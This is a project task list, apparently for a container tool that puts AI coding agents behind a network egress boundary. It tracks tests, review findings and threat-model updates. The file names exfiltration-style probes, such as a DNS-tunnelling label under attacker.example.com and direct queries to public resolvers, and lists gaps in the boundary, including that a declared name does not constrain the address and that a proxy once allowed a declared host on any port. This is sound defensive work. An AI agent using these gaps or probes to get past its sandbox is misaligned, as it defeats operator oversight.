      `TCP_DENIED/000 CONNECT 160.79.104.10:443` — the destination is an **IP, not a hostname**, so
      `ssl::server_name` never matched, `ssl_bump splice allowed_sni` did not fire and `terminate all`
      did. Beyond availability this touches Constitution III: the Dockerfile states a locally-issued CN
      means the config "has silently become `bump`". The forward-proxy path is unaffected
      (`TCP_TUNNEL/200`, spliced). Refusing everything undeclared while breaking everything declared is
      precisely the broken-closed failure T136a exists to catch — do not sign off US4 on the DNS result
      alone.
- [X] T129c [US4] **Readiness gate on the egress boundary** (research R20). `up` returned while the
      boundary was still starting: netfilter is installed first (by design), so a DECLARED destination
      gave curl exit 7 immediately after deploy and exit 0 three seconds later. It fails CLOSED, so this
      is not a hole — but a bare refusal for a declared destination is indistinguishable from the
      refusal an UNdeclared one gets, which defeats the diagnostic layer FR-021/FR-022 exist for. Added
      a healthcheck probing BOTH squid and unbound, and `depends_on: {condition: service_healthy}` on
      the agent and on any sidecar placed inside the boundary. This was the last Phase B acceptance
      failure; `test_agent_cannot_switch_enforcement_off` — THE test for US4 — now passes
      unconditionally and its xfail marker is removed.
- [X] T129e [US4] **Fix the SC-009 assertion, which failed while the port was properly closed** (research
      R21). `curl` exits 0 for a 403, and an undeclared port is now REFUSED WITH A STATUS rather than
      dropped — the improvement R1a wanted. Measured: `http_code=403` from Squid with the proxy vars set,
      exit 6 with them unset. Inverting the assertion would be worse than leaving it broken, since
      `returncode == 0` also passes when the agent genuinely REACHES the port. Now names both acceptable
      outcomes, rejects 2xx/3xx explicitly, and re-probes with the proxy variables REMOVED so the
      netfilter claim does not rest on the agent's cooperation.
- [X] T129d [US4] **DONE — the port-owner migration now runs BOTH ways** (research R22). Three gaps: the detector returned False whenever enforcement was off (the drop direction was unaskable); the migration was gated on `not redeploy`, so the one command that moves the port could not survive it; and the scoping helper read the host key off the host RECORD, which does not carry it, yielding a path that never exists — invisible, because "no migration needed" is also the right answer for the common case. Scoped via the previously generated compose model rather than a runtime probe, so an environment that never had a declaration pays nothing. `test_unenforced_environment_is_never_stale` narrowed rather than deleted, plus a companion test pinning the drop direction.
      The T118 port-owner migration run backwards: the binding must return from `egress` to `agent`, and
      compose cannot bind a port the still-running egress container still holds. **PRE-EXISTING** —
      verified by re-running against `8a6811b`, this session's starting commit; not a regression from
      T128/T129a/T129b/T129c. plan.md anticipated this shape for ADOPTING a declaration but not for
      dropping one. Likely needs the old container stopped before the rebind rather than a plain
      recreate.
- [X] T129 [US5] Implement allowlist-only resolution (FR-020b) — declared names resolve, everything else does not — **DONE, and it is the same code as T111 rather than a second mechanism.** The baked `unbound.conf` carries `local-zone: "." refuse`; the generated `allowed.conf` adds `local-zone: "<name>" transparent` **plus** a `forward-zone` per declared name. Both halves are required: without the per-name `transparent` the catch-all matches first and **declared names are refused too** — an allowlist that permits nothing while passing every refusal test (observed, R17). Ported `{host, port}` entries are included, or a declared SSH remote fails to resolve and looks like a firewall bug. Pinned by doctest plus `test_agent_as_code.py:1688-1740`
- [X] T130 [P] [US5] Record refused resolutions (FR-020d), for the same reason a refused connection is recorded — **DONE, and the fix was the DESTINATION, not the flag.** `log-replies: yes` was already set, but unbound's `use-syslog` **defaults to yes** and the egress image runs no syslogd, so every REFUSED line was handed to `syslog(3)` and discarded — measured: the boundary answered REFUSED and the container log was completely empty. `build_unbound_conf` now emits `use-syslog: no` + `logfile: ""` unconditionally, including for `allow: []`, where the record is the operator's only account of what the agent reached for. Reachable as `agent-container logs <name> --egress`
- [X] T131 [US5] Make a refusal distinguishable from a genuine "no such host" (FR-020e), per T103's finding — **DONE by the T103 resolver choice itself.** unbound's `local-zone: "." refuse` answers **REFUSED** ("policy forbids asking") where dnsmasq's `local=/#/` can only answer NXDOMAIN. That is not cosmetic: NXDOMAIN is a **cacheable negative**, so a client that caches it keeps failing after the operator fixes the declaration and a policy error presents as a DNS bug outliving its cause. The distinction is surfaced to the operator on `logs --egress` ("REFUSED means the name is not declared; NXDOMAIN means the name genuinely does not exist") and is the tell the entrypoint documents for a mis-ordered DNAT
- [X] T132 [US5] Add the **SSH arm to FR-003c's deploy-time check** — default-deny kills `git push` over SSH unless port 22 is declared. Hard Constraint #1 breaking from the opposite direction to Phase A's HTTPS case — **DONE.** The SSH arm fires only under TRANSPARENT enforcement — under the proxy, `ssh` does not honour `https_proxy` and the push genuinely works, so warning there would train operators to ignore the check. `ssh_remote_endpoint` parses both spellings git accepts and returns None for a non-numeric or out-of-range port rather than coercing to 22: a check that passes for the WRONG endpoint is worse than no check. Escalation is shared with the HTTPS arm, so severity cannot come to depend on the remote's URL scheme.
- [X] T133 [P] [US5] Add a test for T132: fires for an SSH remote with no `{host, port: 22}` entry, silent when declared — **DONE.** Fires for all three SSH spellings; silent when `{host, port: 22}` is declared. Also pins FR-018a's port-selects-the-mechanism rule from the direction that matters: declaring the host PORTLESS (the proxy's surface) or on a DIFFERENT port must NOT report an SSH push as safe. `test_push_check_is_silent_for_ssh_remotes` renamed and narrowed — its old name claimed SSH is always unaffected, which Phase B falsified.

### Default-deny acceptance (US5)

**STATE OF THIS BLOCK (reconciled at T145).** Every test below **exists and is named**; none is
ticked, because the last full tier (R23: `50 passed, 2 skipped, 2 failed`, both failures a cold
image build) ran at `e25066f`, and `5ed4bfa` has since changed the entrypoint's ACCEPT scoping and
the point at which the declared-port fragment is sourced — which is exactly the machinery T135 and
T138 assert. **These are written but unverified against the current boundary**, so they close with
T146's tier run, not before. The tests:

| Task | Test in `bin/tests/test_acceptance.py` |
|---|---|
| T134 | `test_agent_cannot_reach_a_non_standard_port` |
| T135 | `test_a_declared_port_opens_that_host_and_that_port_only` |
| T136 | `test_an_undeclared_name_does_not_resolve_including_a_tunnelling_label` |
| T137 | `test_a_public_resolver_cannot_be_queried_directly` |
| T138 | `test_git_push_over_declared_ssh_reaches_the_remote` |
| T139 | `test_an_undeclared_environment_keeps_its_own_network` |

Still genuinely unwritten: **T125**, **T127**, **T127a** (and T137a, which cannot be written as
specified — see its note).

- [ ] T134 [US5] Acceptance: an undeclared **non-standard HTTP port** (8080) and an arbitrary port (1337) both fail (SC-009, quickstart S13). **The first design sketch got this wrong** — redirecting only 80/443 under default-accept lets 8080 through, which is worse than no control
- [ ] T135 [US5] Acceptance: a declared `{host, port: 22}` is reachable at **that host and that port only** — not the protocol generally, not another host (SC-010, quickstart S14)
- [ ] T136 [US5] Acceptance: an undeclared name does not resolve, **including a tunnelling-shaped label** like `ZXhmaWx0cmF0ZWQ.attacker.example.com` (SC-012, quickstart S15)
- [X] T136a [US5] Acceptance: a **declared** name still resolves and the environment works end to end (US5 scenario 3). **An allowlist-only resolver that resolves NOTHING passes every other DNS test here** — the positive case is what separates "working" from "broken closed", and broken-closed is the failure this mechanism makes easy
- [ ] T137 [US5] Acceptance: `dig @8.8.8.8` is forced to the sidecar resolver (SC-013, quickstart S15)
- [ ] T137a [US5] Acceptance: on a host where transparent enforcement **cannot** be delivered, `advisory` deploys and names the fallback mechanism while `strict` refuses (US5 scenario 4, FR-007b). SC-004a asserted this for Phase A only; without it `enforced: true` is ambiguous between two mechanisms of very different strength. **CANNOT BE WRITTEN AS SPECIFIED — see T119 and spec FR-021a.** There is no fallback mechanism to name: `egress_enforcement_mode` returns only `transparent` or `none`, so on a host that cannot deliver the boundary `advisory` deploys **unenforced** (stating the specific obstacle) and `strict` refuses. Rewrite the task around that pair of outcomes, or drop it in favour of a unit test over `egress_enforcement_mode`'s two obstacle branches — do not leave it phrased around a mechanism the tool deliberately does not have
- [ ] T138 [US5] Acceptance: `git push` over declared SSH **succeeds** (quickstart S18). If this fails the feature is unshippable, whatever else passes
- [ ] T139 [US5] Acceptance: an environment with **no** declaration is untouched — no rules, no forced DNS, unrestricted (FR-004, quickstart S19). Default-deny applies to opt-in environments, **never retroactively**

**Checkpoint**: US5 independently testable. Run quickstart S13, S14, S15, S18, S19.

---

## Phase 11: Honesty and polish

- [X] T140 Rewrite the enforcement-strength statement (FR-022) in `bin/agent-container` — enforcement is now **packet-level and does not depend on the agent's cooperation**; what remains outside are deliberately-placed sidecars, each named — **DONE.** The statement is MODE-AWARE: under transparent enforcement the old text is not merely cautious but FALSE (it says the feature does not do packet filtering, and Phase B does). The correction runs both ways — the packet-level text names its residual limits as specifically as its guarantees, because describing the boundary as absolute is the same defect with the sign flipped. Limits named: not content inspection; TLS never terminated so traffic to a DECLARED host is unseen and unlimited; **the connection is spliced to the address the CLIENT chose** (squid logs `ORIGINAL_DST`), so a declared NAME does not constrain the ADDRESS; and `sidecars_outside` sits outside entirely. The mode is resolved ONCE at the call site and shared with the SSH push check so the two cannot disagree.
- [X] T141 **Rewrite, do not delete, the overclaim test** in `bin/tests/test_cli.py`. Some of "guarantee"/"blocks all"/"prevents all" becomes defensible under packet-level enforcement — decide which, and keep a guard. Deleting it at the moment the claims get stronger is exactly the wrong instinct — **DONE — rewritten, not deleted.** The proxy test is scoped to the proxy (its clauses are true of the fallback, not universal), and the packet-level statement gets its own presence checks plus the SAME absence test: being able to defend more is not licence to claim everything. Added `test_the_two_statements_are_actually_different` — a mode-aware statement collapsed to one string would pass every presence check while telling the operator nothing about which mechanism they got. Both guards are proved able to FAIL in `test_guards_can_fail.py`, since an absence assertion passes just as happily against a string that says nothing.
- [ ] T142 [P] Rewrite `docs/egress.md` — enforcement is a boundary now, not a convention. Correct the "proxy-level, not packet-level" framing throughout
- [ ] T143 [P] Update `docs/execution.md` and `docs/orchestration.md` for the shared namespace and the port-owner move
- [X] T144 Re-measure `CLAUDE.md` against its 2000-token budget with a real tokenizer, and update the egress invariant — it currently says "proxy-level", which Phase B falsifies — **DONE.** Measured with `tiktoken`, not estimated: 1962 before, 2036 after the rewrite alone, **1978 (`cl100k_base`) / 1973 (`o200k_base`) after pruning**. The invariant now reads packet-level and names the three things a reader must not get wrong: `NET_ADMIN` is on the **sidecar** and the agent holds none, squid **splices and never bumps** (a locally-issued CN means the boundary inverted), and a declared **port** selects netfilter over the proxy allowlist. The rewrite alone put the file 36 tokens **over**, so seven bullets were pruned before this task was called done — the number is measured after every edit, not estimated once
- [X] T145 Re-run the identity check against the T001 baseline. **It will pass** — the port number is unchanged — so verify the *port owner* separately; the lock cannot see that, which is why T116/T117 exist — **DONE, and it passed as predicted.** `test_pure_logic.py` + `test_compose.py`: 178 passed. All six baseline rows match (`agent-container-acme`/2206 through `agent-container-zzz-999`/2282), all nine volume names in canonical order, and the only permitted deviation is still the one shellenv mount PATH.
      **The port owner IS covered**, in one place, by `test_compose.py::test_the_published_port_moves_to_the_egress_service`: the agent publishes `<port>:2222` with no declaration, publishes **nothing** with one (`"ports" not in agent`), and the egress service publishes the same number. The gating is a single condition (`egress_filter_body is not None`) shared with `network_mode`, so the two cannot come apart, and there is no `cooperative` mode that would move the port without the namespace (T119). The runtime half is covered too, in **both** directions, by `test_lifecycle.py:444-505`.
      **One vacuous assertion found, and it is the one T117's text names.** `test_compose.py:208` reads `assert wiz.port_for_name("acme") == wiz.port_for_name("acme")` — a tautology that holds for any return value, so the "asserting `port_for_name` is unchanged" half of T117 is not asserted there. The number itself is genuinely pinned, one file over, by `test_pure_logic.py::test_identity_is_unchanged_by_feature_011`. Fix is one of: `== 2206` (the T001 baseline literal), or delete the line and point the docstring at the test that does pin it. **Left for the owner of that file** — flagged, not edited
- [X] T145a **Reconcile `docs/threat-model.md`** — Constitution 2.2.0 makes this MUST for any feature altering a trust boundary, and Phase B alters it more than anything else in the project. Flip the `012 Phase B` row to ✅ and record what actually changed: **T4 → mitigated**, **T5 → mitigated**, and §5's four "not mitigated" bullets under T4 rewritten. Also record what Phase B **newly introduces** — a container holding `NET_ADMIN`, and a resolver the whole environment depends on. **By the constitution's own words, Phase B has not landed until this row is updated** — **DONE.** T4 → **mitigated**, with all four Phase A bullets re-measured rather than asserted away; T5 → **mitigated** (sidecars inside by default, `sidecars_outside` the declared exception); T7 restated because `NET_ADMIN` now genuinely exists in the deployment; §2/§3/§4 updated for the sidecar as an actor, the boundary as an asset, and a boundary that is now a *set* of containers whose interior is unfiltered loopback by construction. **Two new threats the phase introduced rather than inherited**: **T13** — squid splices to `ORIGINAL_DST`, so a declared *name* does not constrain the *address* (measured this session; already stated in the tool's own output, which is why the doc could not go on omitting it); **T14** — the sidecar is new surface and a hard dependency, with the readiness window recorded as failing **closed**. §5 T12 gained six further instances of the check-that-passes-while-broken shape found in this phase. The structural guards (`test_threat_model_names_every_feature`, `test_threat_model_reconciled_rows_name_their_threats`, and their can-fail proofs) were re-run: green
- [ ] T146 Run `scripts/quality-gate.sh` **unpiped** plus the full acceptance tier, and verify quickstart S12–S19 by hand

---

## Phase B dependencies

```text
Phase 7 (T100-T104)   mechanism proven — T102 and T104 BLOCK everything
        ↓
Phase 8 (T105-T114)   generation; T112 migrates Phase A's schema
        ↓
   ┌────┴────┐
   ↓         ↓
Phase 9    Phase 10   US4 and US5 share the netfilter surface but test independently
(US4)      (US5)
   └────┬────┘
        ↓
Phase 11 (T140-T146)  T145 blocking
```

- **T102 blocks everything** — no splice, no phase.
- **T104 blocks T115** — if the agent gains a capability, the design has inverted its own principle.
- **T105 blocks T107/T109/T111** — all three renderings read the same parsed list.
- **T116 blocks T118** — the migration must exist before it can be applied to running environments.

## Phase B parallel opportunities

| Batch | Tasks | Why safe |
|---|---|---|
| Rendering tests | T106, T108, T110, T113 | independent assertions over separate generators |
| Docs | T142, T143 | separate files |
| DNS detail | T130, T133 | different modules from the netfilter work |

US4 and US5 can proceed in parallel after Phase 8 — they share the mechanism but their tests and
failure modes are disjoint.

## Phase B task count

| Phase | Tasks |
|---|---|
| 7 — B1 image | 5 |
| 8 — B2 generation | 10 |
| 9 — US4 | 14 |
| 10 — US5 | 14 |
| 11 — polish | 8 |
| **Phase B total** | **51** |
| **Feature total** | **115** (64 Phase A + 51 Phase B) |


## Adversarial review findings — remaining (ultracode, 30 agents, 12 confirmed / 8 refuted)

**ALL FIVE ARE BEING WORKED THIS ROUND, IN PARALLEL, AND THE WORK IS UNCOMMITTED.** At the time of
the T145 reconciliation the tree carries in-flight edits to `bin/agent-container` and
`image/egress/squid.conf` addressing T148, T149, T150 and T151, plus a probe in progress for T147.
None is ticked here, because none is committed or verified — **do not treat the code you can read
as the record**. Whoever lands them ticks their own row with the usual measured note.

Two cross-cutting notes for those agents:

1. **The T151 `mechanism` field and T121 are the same surface.** `egress_payload` also has no
   `sidecars_outside`, so a machine consumer cannot see either which mechanism it got or which
   containers sit outside it. Adding one field and not the other leaves `enforced: true` ambiguous
   in the second way instead of the first.
2. **The in-flight T-fix to `disclose_builtin_default` breaks a committed test.** It replaces the
   `egress.providers` remediation (correctly — that key is the one shape `validate_egress` refuses
   outright, so the advice answered a warning with a hard failure) but `bin/tests/test_cli.py:395`
   still asserts `"egress.providers" in err` under the message *"must say how to constrain it"*.
   Reproduced: `test_builtin_default_is_disclosed_when_nothing_is_declared` **FAILS** in the working
   tree. The test must move to the new remediation and, better, put it back through
   `validate_egress` the way `test_compose.py:378` already does for the sibling message — that
   sibling had such a test and this one did not, which is precisely why the defect survived one
   function over.

- [ ] T147 **`{host, port}` pins DNS at rule-install time.** `iptables -d <host>` expands to the
      addresses resolved at insert time and pins them. A declared endpoint whose addresses rotate
      (github.com, any CDN-fronted git host) stops being reachable while the declaration still reads
      as permitting it — and after the T129c readiness gate the failure appears as a working
      deployment whose pushes fail later. Nothing in research.md measures it. Probe before T146.
- [ ] T148 **A wildcard host with `port:` validates but renders an iptables rule that cannot exist**,
      and the tool reports it as permitted (`bin/agent-container` validate_destination). Netfilter has
      no wildcard destination. Either refuse the combination at validation with a message naming the
      mechanism, or resolve it — but it must not validate and then silently not exist.
- [ ] T149 **Adopting a declaration breaks every sidecar hostname.** Under `network_mode: service:`
      the sidecars share one namespace, so service-name DNS no longer resolves between them; the
      current error steers the operator toward a fix that cannot work. Confirmed by measurement.
- [ ] T150 **squid's `access_log` writes to a file nothing can read** (`image/egress/squid.conf`:
      `stdio:/var/log/squid/access.log`). T130 fixed the DNS half of "a refusal is a record"; the
      CONNECTION half is still false. Should be `stdio:/dev/stdout`.
- [ ] T151 **`--json` cannot report WHICH mechanism was obtained** — `enforced` is a boolean with no
      mechanism field. FR-021's promise is that an operator can tell which enforcement they got, and
      a machine consumer currently cannot.

### Refuted by the verification pass (recorded so they are not re-raised)

IPv6 has no separate filtering but is not reachable (no v6 route in the namespace); SC-009's port
test does exercise what it names; the subdomain-under-a-declared-name exfiltration path is real but
downgraded to low — it requires the operator to have declared the parent domain, which is the
documented meaning of a domain entry; the proxy strength statement is not printed when nothing is
enforced; a sidecar publishing ports fails loudly at the daemon rather than silently.

## Verification findings — T146 (the authoritative run)

Found by running the tier and the quickstart on live containers, not by reading.
The gate and the tier are both green; these are what the run found in addition.

- [X] T146a **`refuse_sidecar_name_in_allow` refused a deployment that works, with a
      message asserting something false about it** — FIXED. The T149 refusal ran before
      `enforce_egress_declaration` and fired on any declaration with an override, but its
      entire premise is the shared namespace, which exists only when a boundary is
      actually deployed. An `advisory` declaration that cannot be enforced (no reachable
      `image/egress/Dockerfile` — the documented non-editable PyPI install — or an
      override redefining the `egress` service) deploys UNENFORCED: sidecars stay on the
      project network and service-name DNS between them keeps working. `enforced` is now a
      keyword with **no default** and the call site is gated on the same `_enforced` the
      boundary overlay uses. **Why nothing caught it:** every test called the function
      directly with a declaration, and `test_inside_and_outside_are_computed_in_one_place`
      compares `sidecars_inside_boundary` to the overlay — both of which answer the
      *conditional* question — so the equality held while the condition that actually
      decides placement was a third thing neither side saw. New test
      `test_the_refusal_is_silent_when_no_boundary_is_actually_DEPLOYED` pins both branches
- [X] T146b **The deploy-time record statement and `do_logs` still described the pre-T150
      world** — FIXED. Both said the record was "scoped to resolutions only" *because*
      squid logged to a file. After T150 refused connections are in the same stream, so
      the scoping would send the operator whose HTTPS host is undeclared — the common case
      — looking for a record the tool told them it did not cover. Verified live: the new
      line prints, and both halves are in `logs --egress`
- [X] T146c **A tautology where T117's text claims its assertion is** — FIXED.
      `test_compose.py` asserted `port_for_name("acme") == port_for_name("acme")` and
      derived the expected `ports:` value from the same function, so a drifted port moved
      both sides of every assertion together. Now the literal `2206:2222` baseline
- [X] T146d **C7's field table listed `egress.enforced` twice and never listed
      `mechanism`** — FIXED: deduped, and the T151 field documented
- [ ] T152 **The healthcheck is ~79% of the refusal record** (research **R25**, measured).
      `nc -z 127.0.0.1 3127` opens a request-less connection to squid every ~3 s and each
      one is logged, so the FR-020d record T150 delivered is diluted ~28,800 lines/day in
      an always-on container. Enforcement is unaffected; legibility is not. **Two
      `access_log` ACL filters were tried and measured INEFFECTIVE** (`url_regex` on the
      pseudo-URL, and `method NONE`) — an ACL that cannot be evaluated does not match, so
      the negation stays true; both were reverted rather than shipped with a comment
      claiming verification. Two more were rejected on reasoning (`http_status 000` and
      the client address both discard real refusals). The fix belongs in the **healthcheck**,
      which is a readiness gate the fail-closed behaviour depends on (T129c/R20) and so
      needs its own start-up-window measurement
- [ ] T153 **quickstart S14's stated expectation for the undeclared port is wrong about the
      mechanism** — the same defect shape S13 already had. It says `ssh -p 443 git@github.com`
      "**times out**". Measured: the connection is DNAT'd into squid, which terminates it, so
      ssh reports `kex_exchange_identification: Connection closed by remote host` /
      `Connection closed by 140.82.121.4 port 443` — a *closed* connection, not a timeout.
      A verifier following the step reads correct behaviour as a failure. The acceptance
      test `test_a_declared_port_opens_that_host_and_that_port_only` already documents the
      real mechanism ("443 is redirected into squid … `ssl_bump terminate` ends it, curl
      exit 35") and asserts only `returncode != 0`, so the code and the test are right and
      only the quickstart prose is stale. **SC-010 itself is confirmed solid**: with
      `{host: github.com, port: 22}` declared, `https://github.com/` gives curl exit 35
      direct and `CONNECT tunnel failed, response 403` proxied, while the declared provider
      on 443 still returns 0
- [ ] T154 **S15 cannot be executed as written: the agent image has neither `dig` nor `nc`.**
      The step says to run `dig +time=5 +tries=1 @8.8.8.8 attacker.example.com`; both tools
      are absent, and agents must never `apt install` at runtime. The property was verified
      instead with the acceptance module's own `_DNS_PROBE` (raw-socket UDP/53), which is
      what that test already uses — `@8.8.8.8` and `@1.1.1.1` both return
      `NORESPONSE … [Errno 1] Operation not permitted`, the declared name returns `RCODE 0`
      and undeclared/tunnelling names `RCODE 5`. Either rewrite the step around a tool the
      image has, or state that it needs the probe


## Second adversarial + holistic review (ultracode, 24 agents; 10 confirmed of 7 lenses)

Fixed in this pass:
- **The forward proxy constrained the HOST but not the PORT.** `dstdomain` says nothing about the
  port, so `CONNECT <declared-host>:6379` through the tool's own proxy was ALLOWED and squid dialled
  out — measured `TCP_TUNNEL/503 … HIER_DIRECT/<ip>`, where the 503 was the origin not listening
  rather than squid refusing. A portless entry means "this host over HTTP/HTTPS" everywhere else in
  the feature, so this contradicted a printed guarantee. Now `TCP_DENIED/403`. Found independently
  by four of the seven lenses.
- **Two holes in the D4 fail-open fix, both in code written the same day.** The lenient probe globbed
  `PROJECT_MARKER/*` non-recursively while the loader uses `rglob`, so a spec in a subdirectory was
  invisible and the fail-open persisted for exactly those projects; and a YAML *parse* error in a
  spec carrying an `egress:` block returned False — i.e. "undeclared", i.e. UNRESTRICTED — on the
  single most likely mistake in this feature's own syntax, since a mis-indented `egress:` block never
  reaches the validator that would have named it. It now refuses, naming the file.
- **My own unscoped-ACCEPT guard had three blind spots**, each enough to reopen the D1 hole with the
  full suite green: it accepted `-o eth0` as "scoping" (eth0 is the route to everywhere), and could
  not see the `-m multiport --dports` or long-option spellings.
- **`{host, port: 80}` / `{host, port: 443}` validated, were reported permitted, and rendered a rule
  that can never match** — both ports are REDIRECTed into squid in the nat table, which runs before
  the filter ACCEPT. Refused now, naming the mechanism, rather than silently rewritten to the
  portless form: the two forms permit different things.

- [ ] T152 **squid's access log is ~79% healthcheck noise** (research R25). `nc -z 127.0.0.1 3127`
      opens a request-less connection every ~3s, logged as `NONE_NONE/000 error:transaction-end-
      before-headers` — measured 53 of 67 lines, ~28,800/day. Enforcement is unaffected; the FR-020d
      RECORD degrades. Two `access_log` ACL filters were tried and **measured ineffective** (an ACL
      cannot be evaluated on a transaction with no request) and reverted rather than shipped with a
      comment claiming verification. The fix belongs in the healthcheck.
- [ ] T153 **quickstart S14's expected result is wrong.** A declared host on an undeclared port is
      not a timeout — it is `kex_exchange_identification: Connection closed by remote host`, because
      the connection is DNAT'd into squid and terminated. SC-010 itself verified sound.
- [ ] T154 **quickstart S15 is not runnable as written** — the agent image has neither `dig` nor `nc`.
      The property verified via a raw-socket probe: `@8.8.8.8` → `Operation not permitted`, declared
      → RCODE 0, undeclared and the tunnelling label → RCODE 5 (REFUSED, not NXDOMAIN).
- [X] T155 **DONE — and the first implementation did not detect the case it was written for.** It warned only when a host resolved to MORE THAN ONE address simultaneously; the real resolver then showed `github.com` returning a SINGLE address (140.82.121.3) while R24 had separately proved .3, .4 and .5 all exist. It rotates ACROSS queries over time, not within one answer, so a count-based check was silent for exactly the canonical host — a check passing while the thing it names is broken. Rewritten to warn on the condition that is actually knowable: a packet rule built from a NAME is pinned, full stop. IP literals are exempt (nothing to re-resolve); resolved addresses are reported as information, not as the trigger; and the warning still fires when the probe fails, so it depends on the mechanism rather than on the deploying machine's resolver. The probe is bounded on an abandoned daemon thread because `getaddrinfo` honours no timeout and this runs on the deploy path.
      rule pins them (research R24). This is the verification agent's recommendation before
      `{host, port}` is relied on for git remotes, and it converts the last silent part into a
      stated one.
- [ ] T156 **`sidecars_outside` is invisible to drift detection**, so `apply` reports "matching" after
      a change that moves a sidecar in or out of the boundary.
- [ ] T157 **`test_completions.sh` flakes under load** — a pty-driven zsh completion assertion went
      empty twice immediately after the container tier, green on five other runs, with zero changes
      to `completions/`. A hard CI gate that can go red while nothing it names is broken.
- [ ] T158 **The proxy strength statement is printed only when nothing is enforced**, so the text
      asserting proxy-level enforcement describes an environment that has none. Defensible under
      FR-021a but worth resolving.
